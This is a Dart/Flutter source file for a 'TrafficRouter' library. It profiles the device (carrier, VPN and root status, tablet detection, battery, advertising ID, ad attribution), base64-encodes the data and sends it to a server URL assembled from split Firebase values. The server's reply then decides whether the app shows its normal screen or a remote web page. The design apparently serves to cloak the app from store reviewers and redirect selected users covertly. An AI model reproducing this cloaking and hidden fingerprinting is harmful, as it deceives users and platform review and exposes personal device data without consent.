import 'dart:convert';
import 'dart:io';

import 'package:advertising_id/advertising_id.dart';
import 'package:android_play_install_referrer/android_play_install_referrer.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:battery_plus/battery_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:devicelocale/devicelocale.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_facebook_sdk/flutter_facebook_sdk.dart';
import 'package:http/http.dart' as http;
import 'package:package_info_plus/package_info_plus.dart';
import 'package:root_check/root_check.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:sim_info/sim_info.dart';
import 'package:traffic_router/src/models/settings.dart';
import 'package:url_launcher/url_launcher_string.dart';

import 'vpn_connection/vpn_connection.dart';

class TrafficRouter {
  final String url;
  final bool override;
  final RouterSettings settings;

  static AppsflyerSdk? _appsflyer;

  static TrafficRouter? _instance;

  TrafficRouter._(this.url, this.override, this.settings);

  static Future<TrafficRouter> initialize(
      {RouterSettings settings = const RouterSettings()}) async {
    print(settings.libs.toString());
    if (_instance != null) return _instance!;

    final prefs = await SharedPreferences.getInstance();

    ///Check initialization
    if (prefs.getBool(settings.paramNames.initiated) ?? false) {
      _instance = TrafficRouter._(
        prefs.getString(settings.paramNames.webViewUrl) ?? '',
        prefs.getBool(settings.paramNames.overrideUrlKey) ?? false,
        settings,
      );
      return _instance!;
    } else {
      ///Get device data
      final requestData = {};
      requestData.addAll(await _getDeviceData(settings));

      ///

      await Firebase.initializeApp();
      try {
        ///Get data from firebase database
        print('7');
        final Map? data = await FirebaseDatabase.instance
            .ref(settings.paramNames.databaseRoot)
            .get()
            .then((val) {
          if (val.value == null) {
            print('Wrong JSON');
            return null;
          }
          return val.value as Map;
        });

        ///TODO add changeable facebook keys at Android
        if (settings.libs.useFacebook && settings.libs.useFacebookChangeable) {
          var res = await _initFacebookSdk(data, settings.paramNames);
          print('FacebookChangeable initialized - $res');
        }

        ///

        ///Get traffic data
        print('6');
        if (settings.libs.useAppsFlyer) {
          final String? appsflyerId = data?[settings.paramNames.appsflyer];
          final String? iosAppId = data?[settings.paramNames.iosAppId];
          final appsflyerData =
              await _getAppsFlyerData(appsflyerId, iosAppId, settings);
          String? appsflyerUid = '';
          if (_appsflyer != null && settings.libs.getAppsFlyerUID) {
            appsflyerUid = await _appsflyer!.getAppsFlyerUID();
          }
          requestData.addAll({settings.paramNames.appsflyerUid: appsflyerUid});
          if (appsflyerData == null) {
            if (settings.libs.useAndroidInstallReferrer) {
              final referrer = (await AndroidPlayInstallReferrer.installReferrer
                          .catchError((e) {
                    print('error at [AndroidPlayInstallReferrer]');
                  }))
                      .installReferrer ??
                  '';
              requestData[settings.paramNames.installRefererKey] = referrer;
            }
          } else {
            requestData.addAll(appsflyerData);
          }
        }

        ///Get fb deeplink
        if (settings.libs.useFacebook && settings.libs.useFacebookDeeplink) {
          print('fb');
          final fbData = await _getFbDeeplink(settings);
          if (fbData != null) requestData.addAll(fbData);
        }

        ///Get advertising ID
        if (settings.libs.collectAID) {
          print('aid');
          final adData = await _getAdvertisingData(settings);
          if (adData != null) requestData.addAll(adData);
        }

        ///Create request
        print('5');
        final url = data?[settings.paramNames.baseUrl1] +
            data?[settings.paramNames.baseUrl2] +
            settings.paramNames.urlPath;
        print(url);
        // print(requestData);
        String jsoniche = json.encode(requestData);
        print('JSON = $jsoniche');
        final encodedData = base64Encode(utf8.encode(jsoniche));
        print(encodedData);
        final request = Uri.tryParse(url)?.replace(
            // path: Settings.urlPath,
            queryParameters: {settings.paramNames.queryParamName: encodedData});
        print('request = $request');

        if (request == null) {
          _instance = TrafficRouter._('', false, settings);
          return _instance!;
        }

        ///
        print('4');
        final response = await http.get(request);

        print('response = ${response.body}');
        final body = jsonDecode(response.body);
        final requestUrl1 = (body[settings.paramNames.url11key] ?? '') +
            (body[settings.paramNames.url12key] ?? '');
        print('request_url = $requestUrl1');
        final requestUrl2 = (body[settings.paramNames.url21key] ?? '') +
            (body[settings.paramNames.url22key] ?? '');
        final overrideUrl = body[settings.paramNames.overrideUrlKey]
                ?.toString()
                .toLowerCase() ==
            'true';
        print('3');

        ///Save for next launches
        prefs.setBool(settings.paramNames.initiated, true);
        prefs.setString(settings.paramNames.webViewUrl, requestUrl2);
        prefs.setBool(settings.paramNames.overrideUrlKey, overrideUrl);

        ///
        print('2');
        _instance = TrafficRouter._(requestUrl1, overrideUrl, settings);
        print('1');
        return _instance!;
      } catch (e) {
        print('Error occurred: $e');
        _instance = TrafficRouter._('', false, settings);
        return _instance!;
      }
    }
  }

  Future<void> _launchInBrowser(String url) async {
    if (await canLaunchUrlString(url)) {
      await launchUrlString(url, mode: LaunchMode.externalApplication);
    } else {
      throw 'Could not launch $url';
    }
  }

  static Future<Map<String, dynamic>> _getDeviceData(
      RouterSettings settings) async {
    String? packageName;
    if (settings.libs.collectPackageName) {
      packageName = (await PackageInfo.fromPlatform()).packageName;
    }

    bool? root;
    if (settings.libs.checkRootStatus) {
      root = Platform.isAndroid ? await RootCheck.checkForRootNative : null;
    }

    String? locale;
    if (settings.libs.collectLocale) {
      locale = await Devicelocale.currentLocale.catchError((err) => '');
    }

    int? batteryLevel;
    bool? batteryCharging;
    if (settings.libs.collectBatteryInfo) {
      batteryCharging = (await Battery()
              .onBatteryStateChanged
              .first
              .catchError((err) => BatteryState.unknown)) ==
          BatteryState.charging;
      batteryLevel = await Battery().batteryLevel.catchError((err) => 0);
    }

    String? deviceInfo;
    bool? isTablet;
    if (settings.libs.collectDeviceInfo) {
      if (Platform.isAndroid) {
        final androidInfo = await DeviceInfoPlugin().androidInfo;
        deviceInfo = '${androidInfo.brand} ${androidInfo.model}';
        try {
          isTablet = MediaQueryData.fromWindow(WidgetsBinding.instance.window)
                  .size
                  .shortestSide >
              settings.paramNames.tabletScreenWidth;
        } catch (_) {
          print("Can't get device screen size");
        }
      } else if (Platform.isIOS) {
        final iosInfo = await DeviceInfoPlugin().iosInfo;
        deviceInfo = iosInfo.utsname.machine;
        isTablet = iosInfo.model?.toLowerCase().contains('ipad') ?? false;
      }
    }

    String? mno;
    if (settings.libs.collectMnoInfo) {
      mno = await SimInfo.getCarrierName.catchError((err) => 'undefined');
    }

    bool? vpn;
    if (settings.libs.checkVpnStatus) {
      vpn = await CheckVpnConnection.isVpnActive().catchError((err) => false);
    }

    // print(data.toString());
    return {
      settings.paramNames.mnoKey: mno?.toString(),
      settings.paramNames.bundleKey: packageName?.toString(),
      settings.paramNames.batteryPercentageKey: batteryLevel,
      settings.paramNames.batteryStateKey: batteryCharging,
      settings.paramNames.deviceNameKey: deviceInfo,
      settings.paramNames.deviceLocaleKey: locale,
      settings.paramNames.deviceVpnKey: vpn,
      settings.paramNames.deviceRootedKey: root,
      settings.paramNames.deviceTabletKey: isTablet,
    };
  }

  static Future<Map<String, dynamic>?> _getAppsFlyerData(
      String? id, String? appId, RouterSettings settings) async {
    if (id?.isNotEmpty ?? false) {
      print('kek');
      _appsflyer =
          AppsflyerSdk(AppsFlyerOptions(afDevKey: id!, appId: appId ?? ''));
      await _appsflyer!.initSdk(
        registerConversionDataCallback:
            settings.libs.getAppsflyerRegisterConversionDataCallback,
        // registerOnAppOpenAttributionCallback: true,
        // registerOnDeepLinkingCallback: true
      );
      if (!settings.libs.getAppsflyerRegisterConversionDataCallback) {
        return null;
      }
      Map? data;
      _appsflyer!.onInstallConversionData((res) {
        data = res?['data'];
      });

      await Future.delayed(const Duration(seconds: 5));
      if (data?[settings.paramNames.mediaSourceKey] == null &&
          data?[settings.paramNames.agencyKey] == null) {
        return null;
      }
      return {
        settings.paramNames.mediaSourceKey:
            data?[settings.paramNames.mediaSourceKey],
        settings.paramNames.agencyKey: data?[settings.paramNames.agencyKey],
        settings.paramNames.adIdKey: data?[settings.paramNames.adIdKey],
        settings.paramNames.adsetIdKey: data?[settings.paramNames.adsetIdKey],
        settings.paramNames.campaignIdKey:
            data?[settings.paramNames.campaignIdKey],
        settings.paramNames.campaignKey: data?[settings.paramNames.campaignKey],
        settings.paramNames.adgroupIdKey:
            data?[settings.paramNames.adgroupIdKey],
        settings.paramNames.isFbKey: data?[settings.paramNames.isFbKey],
        settings.paramNames.afSitedKey: data?[settings.paramNames.afSitedKey],
        settings.paramNames.httpReferrerKey:
            data?[settings.paramNames.httpReferrerKey],
      };
    } else {
      return null;
    }
  }

  static Future<Map<String, dynamic>?> _getFbDeeplink(
      RouterSettings settings) async {
    try {
      final link = await FlutterFacebookSdk().getDeepLinkUrl;
      if (link != null) {
        return {settings.paramNames.fbDeeplink: link};
      }
    } catch (e) {
      print("Can't get fb deeplink - $e");
    }
    return null;
  }

  static Future<Map<String, dynamic>?> _getAdvertisingData(
      RouterSettings settings) async {
    try {
      final advertisingId = await AdvertisingId.id(true);
      return {settings.paramNames.advertisingId: advertisingId};
    } catch (e) {
      print("Can't get advertising id - $e");
    }
    return null;
  }

  Future<void> routeWithNavigator(
      NavigatorState navigator,
      WidgetBuilder startScreen,
      Widget Function(String url) webViewBuilder) async {
    if (url.isEmpty) {
      print('d0');
      navigator.pushAndRemoveUntil(
          MaterialPageRoute(
            builder: startScreen,
          ),
          (route) => false);
    } else {
      if (override) {
        print('d1');
        _launchInBrowser(url);
      } else {
        print('d2');
        navigator.pushAndRemoveUntil(
            MaterialPageRoute(
              builder: (_) => webViewBuilder(url),
            ),
            (route) => false);
      }
    }
  }

  static Future<bool> _initFacebookSdk(Map? data, ParamNames paramNames) async {
    try {
      FlutterFacebookSdk fbSdk = FlutterFacebookSdk();
      final res = await fbSdk.initializeSDK(
        appId: data?[paramNames.facebookAppId] ?? 'DefaultAppID',
        displayName: data?[paramNames.facebookDisplayName] ?? 'DefaultFbId',
        clientToken:
            data?[paramNames.facebookClientToken] ?? 'DefaultClientToken',
      );
      return res;
    } on PlatformException catch (e) {
      print('[TrafficRouter._initFacebookSdk]: error occurred $e');
      return false;
    }
  }
}
